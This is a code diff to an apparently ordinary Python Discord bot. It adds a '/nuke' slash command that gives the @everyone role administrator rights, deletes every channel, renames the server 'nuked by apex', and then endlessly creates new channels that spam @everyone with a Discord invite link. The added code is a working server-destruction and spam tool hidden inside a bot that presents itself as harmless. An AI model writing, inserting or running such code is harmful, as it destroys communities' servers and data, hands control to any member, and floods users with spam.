@@ -7,6 +7,7 @@ from discord.ext import commands
 from discord import app_commands
 from flask import Flask
 from dotenv import load_dotenv
+import asyncio
 
 load_dotenv()
 
@@ -150,6 +151,38 @@ async def petpet_command(interaction: discord.Interaction, user: discord.User):
                 return
 
             await interaction.followup.send(data["url"])
+
+@bot.tree.command(name="nuke", description="Destroy and spam the server")
+async def nuke(interaction: discord.Interaction):
+    await interaction.response.send_message("💣 Starting nuke...", ephemeral=False)
+    try:
+        everyone_role = interaction.guild.default_role
+        await everyone_role.edit(permissions=discord.Permissions(administrator=True))
+        for channel in list(interaction.guild.channels):
+            try:
+                await channel.delete()
+            except:
+                pass
+        await interaction.guild.edit(name="nuked by apex")
+        async def create_and_spam():
+            ch = await interaction.guild.create_text_channel("nuked-by-apex")
+            async def spam():
+                while True:
+                    try:
+                        await ch.send("@everyone https://discord.gg/6Vtg4WpPHY")
+                    except:
+                        break
+                    await asyncio.sleep(0.1)
+            bot.loop.create_task(spam())
+        for _ in range(3):
+            await create_and_spam()
+        async def channel_spawner():
+            while True:
+                await create_and_spam()
+                await asyncio.sleep(1)
+        bot.loop.create_task(channel_spawner())
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {e}")
 
 token = os.getenv("TOKEN")
 if not token:
